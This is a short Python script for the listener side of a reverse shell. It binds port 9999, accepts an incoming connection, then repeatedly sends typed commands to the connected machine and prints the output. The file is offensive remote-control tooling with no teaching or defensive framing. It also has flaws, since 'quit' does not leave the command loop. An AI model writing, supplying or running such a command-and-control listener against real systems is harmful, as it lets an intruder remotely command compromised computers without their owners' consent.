"""Reverse TCP server script."""
import socket


class Server:
    """Class that holds all the reverse tcp server's methods."""

    def __init__(self, host, port):
        """Set instance variables."""
        self.host = host
        self.port = port
        try:
            self.sock = socket.socket()
        except socket.error as e:
            return e

    def bindSocket(self):
        """Bind port to socket."""
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
        except socket.error as e:
            return e

    def acceptSocket(self):
        """Accept incomming connections."""
        self.conn, self.address = self.sock.accept()
        print("Connection has been established: {}:{}".format(
            self.address[0],
            str(self.address[1])))

    def sendCommands(self):
        """Send commands through the connection, made in self.acceptSocket()."""
        while True:
            print("Type 'quit' to exit out this interpreter.")
            cmd = input()
            if cmd == "quit":
                self.conn.close()
                self.sock.close()
            if len(str.encode(cmd)) > 0:
                self.conn.send(str.encode(cmd))
                clientResponse = str(self.conn.recv(1024), "utf-8")
                print(clientResponse)


if __name__ == '__main__':
    reverseTcp = Server("", 9999)
    reverseTcp.bindSocket()
    reverseTcp.acceptSocket()
    reverseTcp.sendCommands()
